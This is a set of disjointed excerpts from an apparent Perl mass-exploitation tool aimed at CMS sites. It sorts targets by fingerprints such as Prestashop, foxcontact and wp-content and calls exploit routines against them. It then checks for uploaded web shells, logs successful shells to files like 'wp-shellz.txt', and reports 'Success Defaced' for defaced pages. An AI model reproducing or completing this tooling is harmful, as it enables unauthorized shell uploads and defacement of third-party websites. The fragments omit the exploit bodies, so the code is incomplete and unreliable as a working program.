...
open(save, '>>reverse/Prestashop.txt');
    print save "$site\n";
    close(save);
    prestaxbrang();
    prestaouthrxbrang();
...
open(save, '>>reverse/foxcontact.txt');
    print save "$site\n";   
    close(save);
...
indecomfabr();
 ...
 print color("cyan"), "[*]:---> wp-content: ".$site."\n\n";
    open(save, '>>reverse/wp-content.txt');
    print save "$site\n";   
    close(save);
	formcraft();
	}
...
print "\n";
 open (TEXT, '>>resault/wp-shellz.txt');
...
if($checkshell =~/xbrang wolf/) {
    print color('bold green');
print "[+] UPLOADED]\n";
    print color('reset');        open (TEXT, '>>resault/Shell3z.txt');
...
if($check->content =~/Hacked/ ) {
 print " Success Defaced \n ";
        ...
        open (TEXT, '>>resault/Com Media Index.txt');
